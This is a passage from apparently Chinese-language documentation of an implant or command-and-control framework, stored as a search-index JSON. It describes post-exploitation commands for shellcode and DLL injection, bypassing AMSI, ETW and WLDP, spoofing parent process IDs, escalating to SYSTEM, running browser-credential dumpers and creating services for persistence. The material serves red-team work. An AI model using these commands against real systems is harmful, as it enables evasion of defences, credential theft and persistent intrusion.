PE\u52a0\u8f7d\u5668\u5728\u727a\u7272\u8fdb\u7a0b\u4e2d\u52a0\u8f7dDLL\u6587\u4ef6\uff0c\u652f\u6301\u6307\u5b9a\u5165\u53e3\u70b9\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--arch string</code>: \u76ee\u6807\u67b6\u6784\uff08x64,x86\uff09</p> </li> <li> <p><code>-a, --argue string</code>: \u6b3a\u9a97\u8fdb\u7a0b\u53c2\u6570</p> </li> <li> <p><code>--binPath string</code>: \u81ea\u5b9a\u4e49\u8fdb\u7a0b\u8def\u5f84</p> </li> <li> <p><code>-b, --block_dll</code>: \u963b\u6b62\u975e\u5fae\u8f6fDLL\u6ce8\u5165</p> </li> <li> <p><code>-e, --entrypoint string</code>: \u81ea\u5b9a\u4e49\u5165\u53e3\u70b9\u51fd\u6570</p> </li> <li> <p><code>--etw</code>: \u7981\u7528ETW\u8ddf\u8e2a</p> </li> <li> <p><code>-p, --ppid uint32</code>: \u4f2a\u9020\u7236\u8fdb\u7a0bID</p> </li> <li> <p><code>-n, --process string</code>: \u81ea\u5b9a\u4e49\u8fdb\u7a0b\u8def\u5f84</p> </li> <li> <p><code>-q, --quiet</code>: \u7981\u7528\u8f93\u51fa</p> </li> <li> <p><code>-t, --timeout uint32</code>: \u8d85\u65f6\u65f6\u95f4\uff08\u79d2\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code># \u4f7f\u7528\u9ed8\u8ba4\u5165\u53e3\u70b9\nexecute_dll example.dll\n# \u6307\u5b9a\u5165\u53e3\u70b9\nexecute_dll example.dll -e entrypoint -- arg1 arg2\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u6267\u884c-shellcode","title":"\u6267\u884c Shellcode","text":"<p><pre><code>execute_shellcode [shellcode_file] [flags]\n</code></pre> \u5728\u727a\u7272\u8fdb\u7a0b\u4e2d\u6267\u884c\u6307\u5b9a\u7684shellcode\uff0c\u901a\u8fc7\u8fdb\u7a0b\u6ce8\u5165\u5b9e\u73b0\u9690\u853d\u6267\u884c\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--arch string</code>: \u76ee\u6807\u67b6\u6784\uff08x64,x86\uff09</p> </li> <li> <p><code>-a, --argue string</code>: \u6b3a\u9a97\u8fdb\u7a0b\u53c2\u6570</p> </li> <li> <p><code>-b, --block_dll</code>: \u963b\u6b62\u975e\u5fae\u8f6fDLL\u6ce8\u5165</p> </li> <li> <p><code>--etw</code>: \u7981\u7528ETW\u8ddf\u8e2a</p> </li> <li> <p><code>-p, --ppid uint32</code>: \u4f2a\u9020\u7236\u8fdb\u7a0bID</p> </li> <li> <p><code>-n, --process string</code>: \u81ea\u5b9a\u4e49\u8fdb\u7a0b\u8def\u5f84</p> </li> <li> <p><code>-q, --quiet</code>: \u7981\u7528\u8f93\u51fa</p> </li> <li> <p><code>-t, --timeout uint32</code>: \u8d85\u65f6\u65f6\u95f4\uff08\u79d2\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>execute_shellcode example.bin\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u6267\u884c-net-\u7a0b\u5e8f\u96c6","title":"\u6267\u884c .NET \u7a0b\u5e8f\u96c6","text":"<p><pre><code>execute_assembly [file] [flags]\n</code></pre> \u5728Implant\u8fdb\u7a0b\u4e2d\u52a0\u8f7d\u5e76\u6267\u884c.NET\u7a0b\u5e8f\u96c6\uff0c\u652f\u6301\u591a\u79cd\u9632\u5fa1\u7ed5\u8fc7\u673a\u5236\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--amsi</code>: \u7ed5\u8fc7AMSI\uff08Anti-Malware Scan Interface\uff09</p> </li> <li> <p><code>-a, --argue string</code>: \u6b3a\u9a97\u8fdb\u7a0b\u53c2\u6570</p> </li> <li> <p><code>-b, --block_dll</code>: \u963b\u6b62\u975e\u5fae\u8f6fDLL\u6ce8\u5165</p> </li> <li> <p><code>--bypass-all</code>: \u540c\u65f6\u7ed5\u8fc7AMSI\u3001ETW\u3001WLDP</p> </li> <li> <p><code>--etw</code>: \u7981\u7528ETW\u8ddf\u8e2a</p> </li> <li> <p><code>-p, --ppid uint32</code>: \u4f2a\u9020\u7236\u8fdb\u7a0bID</p> </li> <li> <p><code>--wldp</code>: \u7ed5\u8fc7WLDP\uff08Windows Lockdown Policy\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>execute_assembly potato.exe \"whoami\"\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u5185\u8054\u6267\u884c","title":"\u5185\u8054\u6267\u884c","text":"<p>\u5728\u5f53\u524dImplant\u8fdb\u7a0b\u4e2d\u76f4\u63a5\u6267\u884c\u6587\u4ef6\uff08\u9700\u6ce8\u610f\u7a33\u5b9a\u6027\u98ce\u9669\uff09\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u5185\u8054\u6267\u884c-pe","title":"\u5185\u8054\u6267\u884c PE","text":"<p><pre><code>inline_exe [exe] [flags]\n</code></pre> \u5728\u5f53\u524d\u8fdb\u7a0b\u4e2d\u5185\u8054\u6267\u884cEXE\u6587\u4ef6\uff0c\u65e0\u9700\u521b\u5efa\u65b0\u8fdb\u7a0b\u4f46\u53ef\u80fd\u5f71\u54cdImplant\u7a33\u5b9a\u6027\u3002</p> <p>instability warning!!!</p> <p>\u5185\u8054\u6267\u884cEXE\u53ef\u80fd\u5bfc\u81f4Implant\u5d29\u6e83\uff0c\u5efa\u8bae\u4ec5\u5728\u5fc5\u8981\u65f6\u4f7f\u7528\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--arch string</code>: \u76ee\u6807\u67b6\u6784\uff08x64,x86\uff09</p> </li> <li> <p><code>-n, --process string</code>: \u81ea\u5b9a\u4e49\u8fdb\u7a0b\u8def\u5f84</p> </li> <li> <p><code>-q, --quiet</code>: \u7981\u7528\u8f93\u51fa</p> </li> <li> <p><code>-t, --timeout uint32</code>: \u8d85\u65f6\u65f6\u95f4\uff08\u79d2\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>inline_exe hackbrowserdata.exe -- -h\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u5185\u8054\u672c\u5730\u6267\u884c","title":"\u5185\u8054\u672c\u5730\u6267\u884c","text":"<p><pre><code>inline_local [local_exe]\n</code></pre> \u5728Implant\u8fdb\u7a0b\u4e2d\u5185\u8054\u6267\u884c\u672c\u5730PE\u6587\u4ef6\uff0c\u76f4\u63a5\u4f7f\u7528\u76ee\u6807\u7cfb\u7edf\u4e0a\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>-a, --argue string</code>: \u6b3a\u9a97\u8fdb\u7a0b\u53c2\u6570</p> </li> <li> <p><code>-b, --block_dll</code>: \u963b\u6b62\u975e\u5fae\u8f6fDLL\u6ce8\u5165</p> </li> <li> <p><code>--etw</code>: \u7981\u7528ETW\u8ddf\u8e2a</p> </li> <li> <p><code>-p, --ppid uint32</code>: \u4f2a\u9020\u7236\u8fdb\u7a0bID</p> </li> <li> <p><code>-n, --process string</code>: \u81ea\u5b9a\u4e49\u8fdb\u7a0b\u8def\u5f84</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>inline_local whoami\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u5185\u8054\u6267\u884c-dll","title":"\u5185\u8054\u6267\u884c DLL","text":"<p><pre><code>inline_dll [dll] [flags]\n</code></pre> \u5728\u5f53\u524d\u8fdb\u7a0b\u4e2d\u5185\u8054\u6267\u884cDLL\u6587\u4ef6\uff0c\u76f4\u63a5\u52a0\u8f7d\u5230Implant\u7684\u5185\u5b58\u7a7a\u95f4\u3002</p> <p>instability warning!!!</p> <p>\u5185\u8054\u6267\u884cDLL\u53ef\u80fd\u5bfc\u81f4Implant\u5d29\u6e83\uff0c\u5efa\u8bae\u4f18\u5148\u4f7f\u7528\u727a\u7272\u8fdb\u7a0b\u6267\u884c\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--arch string</code>: \u76ee\u6807\u67b6\u6784\uff08x64,x86\uff09</p> </li> <li> <p><code>-e, --entrypoint string</code>: \u5165\u53e3\u70b9\u51fd\u6570</p> </li> <li> <p><code>-n, --process string</code>: \u81ea\u5b9a\u4e49\u8fdb\u7a0b\u8def\u5f84</p> </li> <li> <p><code>-q, --quiet</code>: \u7981\u7528\u8f93\u51fa</p> </li> <li> <p><code>-t, --timeout uint32</code>: \u8d85\u65f6\u65f6\u95f4\uff08\u79d2\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code># \u4f7f\u7528\u9ed8\u8ba4\u5165\u53e3\u70b9\ninline_dll example.dll\n# \u6307\u5b9a\u5165\u53e3\u70b9\ninline_dll example.dll -e RunFunction -- arg1 arg2\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u5185\u8054\u6267\u884c-shellcode","title":"\u5185\u8054\u6267\u884c Shellcode","text":"<p><pre><code>inline_shellcode [shellcode_file] [flags]\n</code></pre> \u5728Implant\u8fdb\u7a0b\u4e2d\u76f4\u63a5\u6267\u884cshellcode\uff0c\u65e0\u9700\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002</p> <p>instability warning!!!</p> <p>\u5185\u8054\u6267\u884cshellcode\u53ef\u80fd\u5bfc\u81f4Implant\u5d29\u6e83\uff0c\u9700\u8c28\u614e\u4f7f\u7528\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--arch string</code>: \u76ee\u6807\u67b6\u6784\uff08x64,x86\uff09</p> </li> <li> <p><code>-n, --process string</code>: \u81ea\u5b9a\u4e49\u8fdb\u7a0b\u8def\u5f84</p> </li> <li> <p><code>-q, --quiet</code>: \u7981\u7528\u8f93\u51fa</p> </li> <li> <p><code>-t, --timeout uint32</code>: \u8d85\u65f6\u65f6\u95f4\uff08\u79d2\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>inline_shellcode example.bin\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u5185\u8054\u6267\u884c-net-\u7a0b\u5e8f\u96c6","title":"\u5185\u8054\u6267\u884c .NET \u7a0b\u5e8f\u96c6","text":"<p><pre><code>inline_assembly [file] [flags]\n</code></pre> \u5728Implant\u8fdb\u7a0b\u4e2d\u5185\u8054\u6267\u884c.NET\u7a0b\u5e8f\u96c6\uff0c\u76f4\u63a5\u52a0\u8f7d\u5230\u5f53\u524d\u8fdb\u7a0b\u7a7a\u95f4\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--amsi</code>: \u7ed5\u8fc7AMSI</p> </li> <li> <p><code>--bypass-all</code>: \u7ed5\u8fc7AMSI\u3001ETW\u3001WLDP</p> </li> <li> <p><code>--etw</code>: \u7ed5\u8fc7ETW</p> </li> <li> <p><code>--wldp</code>: \u7ed5\u8fc7WLDP</p> </li> </ul> <p>\u793a\u4f8b: <pre><code># \u5185\u8054\u6267\u884c.NET\u7a0b\u5e8f\u96c6\ninline_assembly --amsi potato.exe \"whoami\"\n# \u6267\u884c\u5e26\u53c2\u6570\u7684.NET\u7a0b\u5e8f\u96c6\ninline_assembly --amsi potato.exe -- cmd /c whoami\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u7279\u6b8a\u6267\u884c","title":"\u7279\u6b8a\u6267\u884c","text":"<p>\u9488\u5bf9\u7279\u5b9a\u573a\u666f\u7684\u6267\u884c\u65b9\u5f0f\uff0c\u5982BOF\u3001DLL \u751f\u6210\u7b49\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#bof-\u6267\u884c","title":"BOF \u6267\u884c","text":"<p><pre><code>bof [bof]\n</code></pre> \u5728 Windows \u73af\u5883\u7684\u540e\u6e17\u900f\u64cd\u4f5c\u4e2d\uff0c<code>bof</code>\u00a0\u547d\u4ee4\u501f\u52a9 COFF Loader \u6267\u884c BOF\uff08Beacon Object File \uff09\u6587\u4ef6\uff0c\u5b9e\u73b0\u8f7b\u91cf\u3001\u9690\u853d\u7684\u529f\u80fd\u6269\u5c55\u3002\u8be5\u529f\u80fd\u57fa\u4e8e\u00a0 https://github.com/hakaioffsec/coffee \u91cd\u6784\uff0c\u4fee\u590d\u4e86 bundle \u76f8\u5173 bug\uff0c\u652f\u6301\u901a\u8fc7\u7279\u5b9a\u683c\u5f0f\u4f20\u9012\u53c2\u6570\u3002</p> <p>BOF \u7684\u53c2\u6570\u9700\u5728\u00a0<code>--</code>\u00a0\u5206\u9694\u7b26\u4e4b\u540e\u4f20\u9012\uff0c\u4e14\u6bcf\u4e2a\u53c2\u6570\u5fc5\u987b\u4ee5\u7c7b\u578b\u524d\u7f00\u52a0\u5192\u53f7\uff08<code>:</code>\uff09\u7684\u5f62\u5f0f\u5f00\u5934\u3002\u652f\u6301\u7684\u53c2\u6570\u7c7b\u578b\u5982\u4e0b\uff1a</p> <ul> <li> <p><code>str</code>\u00a0- \u7a7a\u7ec8\u6b62\u5b57\u7b26\u4e32\uff08ASCII \u7f16\u7801\uff09</p> </li> <li> <p><code>wstr</code>\u00a0- \u5bbd\u5b57\u7b26\u7a7a\u7ec8\u6b62\u5b57\u7b26\u4e32\uff08Unicode \u7f16\u7801\uff09</p> </li> <li> <p><code>int</code>\u00a0- 32 \u4f4d\u6709\u7b26\u53f7\u6574\u6570</p> </li> <li> <p><code>short</code>\u00a0- 16 \u4f4d\u6709\u7b26\u53f7\u6574\u6570</p> </li> <li> <p><code>bin</code>\u00a0- Base64 \u7f16\u7801\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u5757</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>bof dir.x64.o -- wstr:\"C:\\\\Windows\\\\System32\"\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#dll-\u751f\u6210","title":"DLL \u751f\u6210","text":"<p><pre><code>dllspawn [dll] [flags]\n</code></pre> \u5728\u727a\u7272\u8fdb\u7a0b\u4e2d\u4f7f\u7528\u81ea\u5b9a\u4e49Headless PE\u52a0\u8f7d\u5668\u52a0\u8f7dDLL\uff0c\u4e0e<code>execute_dll</code>\u529f\u80fd\u7c7b\u4f3c\u4f46\u4fa7\u91cd\u52a8\u6001\u751f\u6210\u6267\u884c\u73af\u5883\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--arch string</code>: \u76ee\u6807\u67b6\u6784\uff08x64,x86\uff09</p> </li> <li> <p><code>-a, --argue string</code>: \u6b3a\u9a97\u8fdb\u7a0b\u53c2\u6570</p> </li> <li> <p><code>--binPath string</code>: \u81ea\u5b9a\u4e49\u8fdb\u7a0b\u8def\u5f84</p> </li> <li> <p><code>-b, --block_dll</code>: \u963b\u6b62\u975e\u5fae\u8f6fDLL\u6ce8\u5165</p> </li> <li> <p><code>-e, --entrypoint string</code>: \u81ea\u5b9a\u4e49\u5165\u53e3\u70b9</p> </li> <li> <p><code>--etw</code>: \u7981\u7528ETW\u8ddf\u8e2a</p> </li> <li> <p><code>-p, --ppid uint32</code>: \u4f2a\u9020\u7236\u8fdb\u7a0bID</p> </li> <li> <p><code>-n, --process string</code>: \u81ea\u5b9a\u4e49\u8fdb\u7a0b\u8def\u5f84</p> </li> <li> <p><code>-q, --quiet</code>: \u7981\u7528\u8f93\u51fa</p> </li> <li> <p><code>-t, --timeout uint32</code>: \u8d85\u65f6\u65f6\u95f4\uff08\u79d2\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>dllspawn example.dll\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u975e\u6258\u7ba1-powershell","title":"\u975e\u6258\u7ba1 PowerShell","text":"<p><pre><code>powerpick [args] [flags]\n</code></pre> \u5728Implant\u8fdb\u7a0b\u4e2d\u6267\u884c\u975e\u6258\u7ba1PowerShell\uff08\u4e0d\u4f9d\u8d56powershell.exe\uff09\uff0c\u4ec5\u9650Windows\u7cfb\u7edf\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--amsi</code>: \u7ed5\u8fc7AMSI</p> </li> <li> <p><code>--bypass-all</code>: \u7ed5\u8fc7AMSI\u3001ETW\u3001WLDP</p> </li> <li> <p><code>--etw</code>: \u7ed5\u8fc7ETW</p> </li> <li> <p><code>-s, --script string</code>: PowerShell\u811a\u672c\u8def\u5f84</p> </li> <li> <p><code>--wldp</code>: \u7ed5\u8fc7WLDP</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>powerpick -s powerview.ps1 -- Get-NetUser\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u7cfb\u7edf\u4fe1\u606f","title":"\u7cfb\u7edf\u4fe1\u606f","text":""},{"location":"IoM/guideline/post_exploitation/#\u57fa\u7840\u4fe1\u606f","title":"\u57fa\u7840\u4fe1\u606f","text":"<p>\u6536\u96c6\u76ee\u6807\u7cfb\u7edf\u7684\u57fa\u7840\u4fe1\u606f\uff0c\u4e3a\u540e\u7eed\u64cd\u4f5c\u63d0\u4f9b\u4e0a\u4e0b\u6587\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u7cfb\u7edf\u4fe1\u606f_1","title":"\u7cfb\u7edf\u4fe1\u606f","text":"<p><pre><code>sysinfo\n</code></pre> \u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u5305\u62ec\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u3001\u8865\u4e01\u7ea7\u522b\u3001\u786c\u4ef6\u914d\u7f6e\u7b49\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u5f53\u524d\u7528\u6237","title":"\u5f53\u524d\u7528\u6237","text":"<p><pre><code>whoami\n</code></pre> \u663e\u793a\u5f53\u524d\u6267\u884cImplant\u7684\u7528\u6237\u8eab\u4efd\u4fe1\u606f\uff0c\u5305\u62ec\u7528\u6237\u540d\u3001\u6240\u5c5e\u7ec4\u3001\u6743\u9650\u7b49\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u73af\u5883\u53d8\u91cf","title":"\u73af\u5883\u53d8\u91cf","text":"<p><pre><code>env\n</code></pre> \u5217\u51fa\u76ee\u6807\u7cfb\u7edf\u7684\u73af\u5883\u53d8\u91cf\uff0c\u53cd\u6620\u7cfb\u7edf\u914d\u7f6e\u4e0e\u8fd0\u884c\u73af\u5883\u3002</p> <p>\u5b50\u547d\u4ee4:</p> <ul> <li> <p><code>env set [env-key] [env-value]</code>: \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf</p> </li> <li> <p><code>env unset [env-key]</code>: \u53d6\u6d88\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf</p> </li> </ul> <p>\u793a\u4f8b: <pre><code># \u8bbe\u7f6e\u5de5\u5177\u914d\u7f6e\u73af\u5883\u53d8\u91cf\uff08\u5982\u6307\u5b9a dump \u7ed3\u679c\u8f93\u51fa\u8def\u5f84\uff09\nenv set DUMP_OUTPUT \"C:\\Windows\\Temp\\hidden_dump.bin\"\n\n# \u53d6\u6d88\u4e4b\u524d\u8bbe\u7f6e\u7684 DUMP_OUTPUT \u73af\u5883\u53d8\u91cf\nenv unset DUMP_OUTPUT\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u8fdb\u7a0b\u7ba1\u7406","title":"\u8fdb\u7a0b\u7ba1\u7406","text":"<p>\u67e5\u770b\u4e0e\u7ba1\u7406\u76ee\u6807\u7cfb\u7edf\u7684\u8fdb\u7a0b\uff0c\u4e86\u89e3\u7cfb\u7edf\u8fd0\u884c\u72b6\u6001\u4e0e\u8fdb\u7a0b\u5173\u7cfb\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u8fdb\u7a0b\u5217\u8868","title":"\u8fdb\u7a0b\u5217\u8868","text":"<p><pre><code>ps\n</code></pre> \u5217\u51fa\u76ee\u6807\u7cfb\u7edf\u7684\u6240\u6709\u8fdb\u7a0b\uff0c\u5305\u62ec\u8fdb\u7a0bID\uff08PID\uff09\u3001\u540d\u79f0\u3001\u8def\u5f84\u3001\u6240\u6709\u8005\u7b49\u4fe1\u606f\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u7ec8\u6b62\u8fdb\u7a0b","title":"\u7ec8\u6b62\u8fdb\u7a0b","text":"<p><pre><code>kill [pid]\n</code></pre> \u6839\u636e\u8fdb\u7a0bID\u7ec8\u6b62\u6307\u5b9a\u8fdb\u7a0b\uff0c\u7528\u4e8e\u6e05\u7406\u75d5\u8ff9\u6216\u89e3\u9664\u963b\u788d\u3002</p> <p>\u793a\u4f8b: <pre><code>kill 1234\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u7f51\u7edc\u4fe1\u606f","title":"\u7f51\u7edc\u4fe1\u606f","text":"<p>\u6536\u96c6\u76ee\u6807\u7cfb\u7edf\u7684\u7f51\u7edc\u8fde\u63a5\u72b6\u6001\uff0c\u5206\u6790\u7f51\u7edc\u73af\u5883\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u7f51\u7edc\u8fde\u63a5","title":"\u7f51\u7edc\u8fde\u63a5","text":"<p><pre><code>netstat\n</code></pre> \u5217\u51fa\u76ee\u6807\u7cfb\u7edf\u7684\u7f51\u7edc\u8fde\u63a5\u4fe1\u606f\uff0c\u5305\u62ec\u672c\u5730\u5730\u5740\u3001\u8fdc\u7a0b\u5730\u5740\u3001\u8fde\u63a5\u72b6\u6001\u3001\u534f\u8bae\u7b49\u3002</p> <p>\u5728gui\u4e2d\uff0c\u60a8\u53ef\u4ee5\u53f3\u51fb\u5bf9\u5e94session\uff0c\u70b9\u51fbShow Netstat\u6309\u94ae\u3002\u70b9\u51fb\u540e\uff0c\u5728\u53f3\u4fa7\u4f1a\u663e\u793a\u76ee\u6807\u7cfb\u7edf\u7684\u7f51\u7edc\u8fde\u63a5\u4fe1\u606f\u3002 </p> <p></p>"},{"location":"IoM/guideline/post_exploitation/#\u6743\u9650\u7ba1\u7406","title":"\u6743\u9650\u7ba1\u7406","text":"<p>\u8c03\u6574\u4e0e\u7ba1\u7406Implant\u7684\u6267\u884c\u6743\u9650\uff0c\u83b7\u53d6\u66f4\u9ad8\u64cd\u4f5c\u6743\u9650\u6216\u5207\u6362\u8eab\u4efd\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u7ed5\u8fc7\u4fdd\u62a4","title":"\u7ed5\u8fc7\u4fdd\u62a4","text":"<p><pre><code>bypass [flags]\n</code></pre> \u7ed5\u8fc7\u76ee\u6807\u7cfb\u7edf\u7684\u5b89\u5168\u4fdd\u62a4\u673a\u5236\uff0c\u63d0\u5347\u64cd\u4f5c\u6210\u529f\u7387\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--amsi</code>: \u7ed5\u8fc7AMSI\uff08\u9632\u6076\u610f\u8f6f\u4ef6\u626b\u63cf\u63a5\u53e3\uff09</p> </li> <li> <p><code>--etw</code>: \u7ed5\u8fc7ETW\uff08Windows\u4e8b\u4ef6\u8ddf\u8e2a\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>bypass --amsi --etw\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u63d0\u5347\u6743\u9650","title":"\u63d0\u5347\u6743\u9650","text":"<p><pre><code>getsystem\n</code></pre> \u5c1d\u8bd5\u901a\u8fc7\u591a\u79cd\u673a\u5236\u63d0\u5347Implant\u7684\u6267\u884c\u6743\u9650\u81f3SYSTEM\u7ea7\u522b\uff0c\u83b7\u53d6\u66f4\u9ad8\u7cfb\u7edf\u63a7\u5236\u6743\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u5217\u51fa\u6743\u9650","title":"\u5217\u51fa\u6743\u9650","text":"<p><pre><code>privs\n</code></pre> \u5217\u51fa\u5f53\u524dImplant\u8fdb\u7a0b\u62e5\u6709\u7684\u6743\u9650\uff0c\u5224\u65ad\u53ef\u6267\u884c\u7684\u9ad8\u6743\u9650\u64cd\u4f5c\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u6062\u590d\u539f\u59cb\u4ee4\u724c","title":"\u6062\u590d\u539f\u59cb\u4ee4\u724c","text":"<p><pre><code>rev2self\n</code></pre> \u653e\u5f03\u5f53\u524d\u6a21\u62df\u7684\u7528\u6237\u4ee4\u724c\uff0c\u6062\u590d\u5230Implant\u8fdb\u7a0b\u7684\u539f\u59cb\u4ee4\u724c\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u4ee5\u5176\u4ed6\u7528\u6237\u8eab\u4efd\u8fd0\u884c","title":"\u4ee5\u5176\u4ed6\u7528\u6237\u8eab\u4efd\u8fd0\u884c","text":"<p><pre><code>runas [flags]\n</code></pre> \u4ee5\u6307\u5b9a\u7528\u6237\u7684\u8eab\u4efd\u8fd0\u884c\u7a0b\u5e8f\uff0c\u5229\u7528\u5176\u4ed6\u7528\u6237\u7684\u6743\u9650\u6267\u884c\u64cd\u4f5c\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--username string</code>: \u7528\u6237\u540d</p> </li> <li> <p><code>--domain string</code>: \u57df\u540d\u79f0</p> </li> <li> <p><code>--password string</code>: \u7528\u6237\u5bc6\u7801</p> </li> <li> <p><code>--path string</code>: \u7a0b\u5e8f\u8def\u5f84</p> </li> <li> <p><code>--args string</code>: \u7a0b\u5e8f\u53c2\u6570</p> </li> <li> <p><code>--use-profile</code>: \u52a0\u8f7d\u7528\u6237\u914d\u7f6e\u6587\u4ef6</p> </li> <li> <p><code>--use-env</code>: \u4f7f\u7528\u7528\u6237\u73af\u5883\u53d8\u91cf</p> </li> <li> <p><code>--netonly</code>: \u4ec5\u4f7f\u7528\u7f51\u7edc\u51ed\u636e</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>runas --username admin --domain EXAMPLE --password admin123 --path /path/to/program --args \"arg1 arg2\" --use-profile --use-env\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#http-\u8bf7\u6c42","title":"HTTP \u8bf7\u6c42","text":"<p>\u901a\u8fc7Implant\u53d1\u9001HTTP\u8bf7\u6c42\uff0c\u4e0e\u5916\u90e8\u670d\u52a1\u4ea4\u4e92\u6216\u6d4b\u8bd5\u7f51\u7edc\u8fde\u901a\u6027\u3002</p> <p><pre><code>request [url] [flags]\n</code></pre> \u53d1\u9001HTTP\u8bf7\u6c42\u5230\u6307\u5b9aURL\uff0c\u652f\u6301\u81ea\u5b9a\u4e49\u65b9\u6cd5\u3001\u5934\u4fe1\u606f\u4e0e\u8bf7\u6c42\u4f53\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>-d, --body string</code>: \u8bf7\u6c42\u4f53\u5185\u5bb9</p> </li> <li> <p><code>-H, --header stringArray</code>: HTTP\u8bf7\u6c42\u5934\uff08\u53ef\u591a\u6b21\u6307\u5b9a\uff09</p> </li> <li> <p><code>-X, --method string</code>: HTTP\u65b9\u6cd5\uff08\u9ed8\u8ba4GET\uff09</p> </li> <li> <p><code>-t, --timeout int</code>: \u8bf7\u6c42\u8d85\u65f6\u65f6\u95f4\uff08\u79d2\uff0c\u9ed8\u8ba430\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code># \u7b80\u5355GET\u8bf7\u6c42\nrequest http://example.com\n# POST\u8bf7\u6c42\nrequest -X POST -d \"data\" http://example.com\n# \u81ea\u5b9a\u4e49\u5934\u90e8\nrequest -H \"Host: example.com\" -H \"User-Agent: custom\" http://example.com\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u670d\u52a1\u7ba1\u7406","title":"\u670d\u52a1\u7ba1\u7406","text":""},{"location":"IoM/guideline/post_exploitation/#\u670d\u52a1\u64cd\u4f5c","title":"\u670d\u52a1\u64cd\u4f5c","text":"<p><code>service</code>\u00a0\u547d\u4ee4\u7528\u4e8e\u5bf9\u76ee\u6807\u7cfb\u7edf\u670d\u52a1\u8fdb\u884c\u5168\u751f\u547d\u5468\u671f\u7ba1\u7406\uff0c\u652f\u6301\u521b\u5efa\u3001\u67e5\u8be2\u3001\u542f\u52a8\u3001\u505c\u6b62\u53ca\u5220\u9664\u7b49\u64cd\u4f5c\uff0c\u9002\u7528\u4e8e Windows \u7cfb\u7edf\u7684\u670d\u52a1\u6301\u4e45\u5316\u4e0e\u72b6\u6001\u63a7\u5236\u3002</p> <pre><code>service [\u5b50\u547d\u4ee4]\n</code></pre> <p>\u652f\u6301\u7684\u5b50\u547d\u4ee4\u5305\u62ec\uff1a</p> <ul> <li> <p><code>service create</code>\uff1a\u521b\u5efa\u65b0\u670d\u52a1</p> </li> <li> <p><code>service delete</code>\uff1a\u5220\u9664\u6307\u5b9a\u670d\u52a1</p> </li> <li> <p><code>service list</code>\uff1a\u5217\u51fa\u6240\u6709\u670d\u52a1</p> </li> <li> <p><code>service query</code>\uff1a\u67e5\u8be2\u670d\u52a1\u72b6\u6001</p> </li> <li> <p><code>service start</code>\uff1a\u542f\u52a8\u670d\u52a1</p> </li> <li> <p><code>service stop</code>\uff1a\u505c\u6b62\u670d\u52a1</p> </li> </ul>"},{"location":"IoM/guideline/post_exploitation/#service-create","title":"service create","text":"<p>\u521b\u5efa\u65b0\u7cfb\u7edf\u670d\u52a1\uff0c\u53ef\u6307\u5b9a\u670d\u52a1\u540d\u79f0\u3001\u663e\u793a\u540d\u79f0\u3001\u6267\u884c\u8def\u5f84\u3001\u542f\u52a8\u7c7b\u578b\u7b49\u53c2\u6570\u3002</p> <pre><code>service create [flags]\n</code></pre> <p>\u793a\u4f8b\uff1a \u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>updater_service</code> 